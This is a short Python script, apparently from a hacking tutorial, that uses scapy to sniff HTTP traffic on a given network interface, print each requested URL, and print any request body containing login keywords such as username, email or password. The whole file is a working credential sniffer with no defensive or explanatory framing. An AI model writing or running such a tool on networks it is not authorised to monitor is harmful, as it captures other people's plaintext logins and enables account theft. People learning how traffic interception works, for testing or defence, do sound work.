import scapy.all as scapy
from scapy.layers import http
import optparse

INTERFACE = None
Keywords = [b"username",b"passowrd",b"login", b"log-in",b"log in",\
    b"email",b"pass",b"sign in",b"sign-in"]

def parse_iface():
    global  INTERFACE
    parser = optparse.OptionParser()
    parser.add_option("-i","--iface",dest = "iface",help = "Enter the interface")
    (opts,_) = parser.parse_args()
    INTERFACE = opts.iface

def get_url(pkt):
    return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

def capture_login(pkt):
    if pkt.haslayer(scapy.Raw):
        load = pkt[scapy.Raw].load
        for k in Keywords:
            if k in load:
                return load
    return None

def process_packet(pkt):
    if pkt.haslayer(http.HTTPRequest):
        url = get_url(pkt)
        print( "[+] HTTP Request URL: " +  url.decode())
        load = capture_login(pkt)
        if load is not None:
            print("[+] Captured: " + load.decode())


def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_packet) # Last parameter is a callback

if __name__ == '__main__':
    parse_iface()
    sniff(INTERFACE)


